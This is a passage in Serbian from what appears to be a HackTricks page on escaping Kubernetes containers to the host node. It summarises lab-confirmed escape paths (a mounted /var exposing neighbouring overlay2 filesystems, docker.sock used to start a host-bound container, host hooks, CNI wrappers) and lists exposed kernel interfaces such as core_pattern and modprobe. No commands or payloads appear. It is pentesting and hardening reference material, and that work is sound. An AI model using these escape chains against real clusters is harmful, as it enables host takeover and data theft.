- otkrivanje Docker `overlay2` fajl sistema susednog kontejnera samo za čitanje, preko montiranog `/var`
- kreiranje susednog kontejnera putem Docker API-ja sa host bind-om samo za čitanje, preko montiranog `docker.sock`
- odloženo izvršavanje na hostu preko privremenog hook-a koji obrađuje host
- simulacija CNI wrapper-a koja je sačuvala argumente, standardni ulaz i izvršavanje originalnog dodatka

Isti čvor je izložio `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` i `config.gz`, ali nije izložio `uevent_helper`, EFI promenljive, termalne unose niti `sched_debug`. Destruktivni okidači kernela nisu aktivirani. Ovo potvrđuje da su lanci preko host root-a, `/var`, stanja kubelet-a, soketa i host-potrošača ponovljivi, dok tehnike sa procfs/sysfs pomoćnim mehanizmima moraju ostati uslovne u zavisnosti od tačnog kernela, režima mount-a, putanje payload-a i okidača.

## References

- [1] [Lokalne datoteke i putanje koje koristi Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Kontejner cilium-agent može da pristupi hostu preko mount-a `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
